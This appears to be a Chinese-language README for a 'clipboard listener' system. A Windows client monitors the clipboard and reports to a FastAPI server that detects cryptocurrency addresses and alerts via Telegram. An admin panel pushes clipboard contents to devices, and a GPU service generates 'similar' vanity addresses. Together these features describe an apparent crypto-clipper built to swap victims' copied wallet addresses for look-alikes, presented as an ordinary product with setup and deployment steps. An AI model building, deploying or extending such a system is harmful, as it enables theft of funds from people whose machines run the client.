# Windows Clipboard Listener

一个完整的剪贴板监控系统，支持Windows客户端、Web管理后台和地址生成微服务。

## 项目架构

```
┌─────────────┐     ┌──────────────┐     ┌─────────────┐
│  Windows    │────▶│   主API服务   │────▶│ Vanity服务  │
│  客户端     │ WS  │  (FastAPI)   │HTTP │  (地址生成)  │
└─────────────┘     └──────────────┘     └─────────────┘
                           │
                           ▼
                    ┌──────────────┐
                    │   Vue管理后台  │
                    │   (Admin UI)  │
                    └──────────────┘
```

## 功能特性

- 🖥️ **Windows客户端**：实时监控剪贴板内容
- 🌐 **Web管理后台**：设备管理、剪贴板推送、地址生成
- 🔐 **加密地址检测**：自动识别TRON/BTC/ETH/BNB/Solana地址
- 🤖 **Telegram集成**：地址通知和远程替换
- ⚡ **地址生成服务**：高性能虚荣地址生成（支持GPU加速）

## 快速开始

### 使用Docker Compose（推荐）

```bash
# 克隆项目
git clone https://github.com/yourusername/windows-clipboard-listener.git
cd windows-clipboard-listener

# 启动所有服务
docker-compose up -d

# 查看日志
docker-compose logs -f
```

服务访问地址：
- 主API：http://localhost:8001
- 地址生成服务：http://localhost:8002
- 管理后台：http://localhost:5173

### 手动部署

#### 1. 数据库
```bash
# 安装MySQL 8.0
# 创建数据库
CREATE DATABASE clipboard_db;
```

#### 2. 地址生成服务
```bash
cd vanity-service
pip install -r requirements.txt
python main.py
```

#### 3. 主API服务
```bash
cd server
pip install -r requirements.txt
python main.py
```

#### 4. 管理后台
```bash
cd admin
npm install
npm run dev
```

#### 5. Windows客户端
```bash
cd client/ClipboardClient
dotnet build
dotnet run
```

## 环境配置

### 主服务 (server/.env)
```env
DB_HOST=localhost
DB_USER=root
DB_PASSWORD=yourpassword
DB_NAME=clipboard_db
JWT_SECRET=your-secret-key
VANITY_SERVICE_URL=http://localhost:8002
```

### 地址生成服务 (vanity-service/.env)
```env
PORT=8002
GPU_TOOLS_PATH=./gpu_tools
```

## API文档

### 主服务API
- `GET /` - 健康检查
- `POST /auth/login` - 管理员登录
- `GET /admin/devices` - 获取设备列表
- `POST /admin/devices/{device_id}/push-set` - 推送剪贴板
- `POST /admin/devices/{device_id}/generate-similar` - 生成相似地址

### 地址生成服务API
- `POST /generate` - 同步生成地址
- `POST /generate-async` - 异步生成地址
- `GET /task/{task_id}` - 查询任务状态
- `GET /stats` - 服务统计

## 技术栈

- **后端**：Python FastAPI, SQLAlchemy, WebSocket
- **前端**：Vue 3, Element Plus, TypeScript
- **客户端**：C# .NET 8, Windows Forms
- **数据库**：MySQL 8.0
- **地址生成**：多进程CPU + GPU加速（可选）

## 部署建议

### 生产环境
- 使用Railway部署主服务（$5/月）
- 使用Vercel部署前端（免费）
- 使用Vast.ai部署GPU地址生成（按需）

### 性能优化
- 主服务使用4核CPU
- 地址生成服务可横向扩展
- 使用Redis缓存常见地址模式
